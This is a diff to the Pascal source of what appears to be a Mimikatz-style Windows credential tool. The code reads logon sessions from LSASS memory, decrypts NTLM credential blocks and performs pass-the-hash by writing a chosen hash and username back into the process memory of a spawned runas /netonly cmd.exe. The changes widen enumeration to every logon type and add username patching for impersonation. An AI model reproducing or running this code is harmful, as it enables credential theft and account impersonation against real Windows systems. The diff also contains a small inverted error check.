@@ -548,6 +548,7 @@ var
   credentials,ptr,first,current:nativeuint;
   CREDENTIALW:_CREDENTIALW;
 begin
+  log('************* logonpasswords ****************');
   if pid=0 then exit;
   //if user='' then exit;
   //
@@ -686,7 +687,6 @@ begin
   if hprocess<>thandle(-1) then
        begin
        log('openprocess ok',0);
-
                  //
                  if patch_pos <>-1 then //some more work to find the relative offset
                  if ReadMem  (hprocess,offset+patch_pos,@offset_list_dword,sizeof(offset_list_dword)) then
@@ -715,12 +715,17 @@ begin
                    //while dummy<>inttohex(offset,sizeof(pointer)) do
                    while _KIWI_MSV1_0_LIST_63 (logsesslist ).flink<>offset do
                    begin
+                   //log('luid:'+inttohex(luid,8));
+                   //log(inttohex(_KIWI_MSV1_0_LIST_63 (logsesslist ).LocallyUniqueIdentifier.lowPart,8));
+                   //log(_KIWI_MSV1_0_LIST_63 (logsesslist ).LogonType);
+                   //https://ss64.com/nt/syntax-logon-types.html
+                   //https://techgenix.com/logon-types/
                    //log('entry#this:'+inttohex(i_logsesslist (logsesslist ).this ,sizeof(pointer)),0) ;
                    if ((luid=0) or (luid=_KIWI_MSV1_0_LIST_63 (logsesslist ).LocallyUniqueIdentifier.lowPart))
-                         and ((_KIWI_MSV1_0_LIST_63 (logsesslist ).LogonType=2)
+                         {and ((_KIWI_MSV1_0_LIST_63 (logsesslist ).LogonType=2)
                            or (_KIWI_MSV1_0_LIST_63 (logsesslist ).LogonType=10)
                            or (_KIWI_MSV1_0_LIST_63 (logsesslist ).LogonType=11)
-                           or (_KIWI_MSV1_0_LIST_63 (logsesslist ).LogonType=12)) then
+                           or (_KIWI_MSV1_0_LIST_63 (logsesslist ).LogonType=12))} then
                    begin
                    log('**************************************************',1);
                    if func<>nil then fn(func)(pointer(@logsesslist[0]) );
@@ -729,6 +734,7 @@ begin
                    log('entry#next:'+inttohex(_KIWI_MSV1_0_LIST_63 (logsesslist ).flink,sizeof(pointer)),0) ;
                    //
                    log('LUID:'+inttohex(_KIWI_MSV1_0_LIST_63 (logsesslist ).LocallyUniqueIdentifier.lowPart ,sizeof(_LUID)),1) ;
+                   log('LogonType:'+inttostr(_KIWI_MSV1_0_LIST_63 (logsesslist ).LogonType),1);
                    //log('usagecount:'+inttostr(i_logsesslist (logsesslist ).usagecount),1) ;
                    //get username
                    if ReadMem  (hprocess,nativeuint(_KIWI_MSV1_0_LIST_63 (logsesslist ).username.buffer),bytes )
@@ -864,8 +870,13 @@ begin
                                           //log('sha1:'+ByteToHexaString(PCRED_NTLM_BLOCK(@decrypted[0]).sha1) ,1);
                                           {$endif CPU32}
                                           //PTH time ! lets modify the crendential buffer and write it back to mem
+                                          //log('luid:'+inttostr(luid),1);
+                                          //log('hash:'+hash,1);
                                           if (luid<>0) and (hash<>'') then
                                           begin
+                                          log('***** pass the hash ****',1);
+                                          //we are missing the sha1
+                                          //
                                           {$ifdef CPU64}
                                           if (pos('-1903',winver)>0) or (pos('-1803',winver)>0) or (pos('-1703',winver)>0) or
                                              (pos('-1909',winver)>0) or (pos('-1809',winver)>0) or (pos('-1709',winver)>0) or
@@ -881,6 +892,13 @@ begin
                                           if writemem(hprocess,nativeuint(PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Buffer),@output[0],PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Length)
                                              then log('PTH OK',1)
                                              else log('PTH NOT OK',1);
+                                          //below is to patch the session username, next to the primary taken care by createprocess
+                                          //does the trick for a console whoami...
+                                          //really needed as a runas /netonly will carry the caller name and not the callee name?
+                                          if writemem(hprocess,
+                                                   nativeuint(_KIWI_MSV1_0_LIST_63 (logsesslist ).username.buffer),
+                                                   pwidechar(@decrypted[PCRED_NTLM_BLOCK(@decrypted[0]).usernameoff]),
+                                                   _KIWI_MSV1_0_LIST_63 (logsesslist ).username.Length ) then log('writemen failed!!!');
                                           end;//if luid<>0 then
                                           end;
                                        if PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).len=14 then
@@ -914,7 +932,8 @@ begin
                                end;
                             }
        closehandle(hprocess);
-       end;//if openprocess...
+       end//if openprocess...
+       else log('openprocess failed:'+inttostr(getlasterror),1);
 
 end;
 
@@ -980,7 +999,12 @@ begin
   si.dwFlags := STARTF_USESHOWWINDOW;
   si.wShowWindow := 1;
   //Si.lpDesktop := 'winsta0\default';
-  bret:=CreateProcessWithLogonW(pwidechar(widestring(user)),pwidechar(widestring(domain)),pwidechar(widestring('')),LOGON_NETCREDENTIALS_ONLY,nil,pwidechar({sysdir+'\'+}'cmd.exe'),CREATE_NEW_CONSOLE or CREATE_SUSPENDED ,nil,nil,@SI,@PI);
+  //runas /netonly
+  bret:=CreateProcessWithLogonW(pwidechar(widestring(user)),pwidechar(widestring(domain)),pwidechar(widestring('')),
+                               LOGON_NETCREDENTIALS_ONLY,
+                               nil,pwidechar({sysdir+'\'+}'cmd.exe'),
+                               CREATE_NEW_CONSOLE or CREATE_SUSPENDED ,
+                               nil,nil,@SI,@PI);
   if bret=false then writeln('CreateProcessWithLogonW failed: '+inttostr(getlasterror));
 
   if bret=true then
@@ -989,8 +1013,8 @@ begin
      fillchar(stats,sizeof(stats),0);
      if OpenProcesstoken(pi.hProcess ,TOKEN_READ,token)= true
         then if GetTokenInformation(token,tokenstatistics,@stats,sizeof(stats),len)
-           then writeln('LUID:'+inttohex(stats.AuthenticationId,sizeof(stats.AuthenticationId)));
-     writeln('PID:'+inttostr(pi.dwProcessId) );
+           then log('LUID:'+inttohex(stats.AuthenticationId,sizeof(stats.AuthenticationId)),1);
+    log('PID:'+inttostr(pi.dwProcessId),1 );
     if stats.AuthenticationId<>0 then
     begin
     //cycle thru logonsessions to match the luid
